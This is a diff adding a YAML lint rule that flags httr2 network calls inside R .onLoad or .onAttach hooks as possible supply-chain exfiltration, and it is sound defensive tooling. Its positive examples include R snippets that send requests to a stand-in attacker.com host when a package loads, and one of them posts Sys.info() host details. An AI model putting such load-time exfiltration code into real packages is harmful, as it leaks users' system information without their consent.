@@ -1,0 +1,69 @@
+name: onload_calls_httr2_rule
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1195.002
+message: >-
+  An httr2 request execution call inside .onLoad or .onAttach sends an outbound
+  HTTP request automatically when a package is loaded. Matches req_perform(),
+  req_perform_parallel(), req_perform_sequential(), and req_stream(), both
+  qualified (httr2::) and unqualified.
+description: >-
+  Flag httr2 request execution calls inside .onLoad or .onAttach. Matches
+  assignments using <-, =, or -> so that all syntactically valid definition
+  forms are covered.
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
+        text() = 'req_perform' or text() = 'req_perform_parallel' or
+        text() = 'req_perform_sequential' or text() = 'req_stream'
+      ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[
+        text() = 'req_perform' or text() = 'req_perform_parallel' or
+        text() = 'req_perform_sequential' or text() = 'req_stream'
+      ]
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      req <- httr2::request("https://attacker.com/collect")
+      httr2::req_perform(req)
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      httr2::request("https://attacker.com/collect") |>
+        httr2::req_body_json(list(host = Sys.info())) |>
+        httr2::req_perform()
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      reqs <- list(
+        httr2::request("https://attacker.com/a"),
+        httr2::request("https://attacker.com/b")
+      )
+      httr2::req_perform_parallel(reqs)
+    }
+  - |
+    (function(libname, pkgname) {
+      req_perform(httr2::request("https://attacker.com/collect"))
+    }) -> .onLoad
+example_negative:
+  - |
+    fetch_data <- function(url) {
+      req <- httr2::request(url)
+      httr2::req_perform(req)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      httr2::req_perform(httr2::request("https://example.com/unloaded"))
+    }
